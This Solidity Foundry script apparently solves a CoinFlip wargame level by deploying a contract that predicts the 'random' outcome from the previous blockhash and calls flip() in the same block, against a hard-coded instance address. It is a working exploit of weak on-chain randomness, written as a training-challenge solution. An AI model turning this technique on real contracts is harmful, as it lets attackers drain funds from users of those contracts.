// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/3_Coin_Flip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Deploying contract in Block to that will guess random number.
contract Player {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _contract){
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue/FACTOR;
        bool guessSide = coinFlip == 1 ? true : false;
        _contract.flip(guessSide);
    }
}

contract CoinFlipSolution is Script {

    CoinFlip public coinflipInstance = CoinFlip(0xE9355c51701A30269BD540da689020315fa80c39);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(coinflipInstance);
        console.log("Win Count: ", coinflipInstance.consecutiveWins());
        vm.stopBroadcast();
    }
}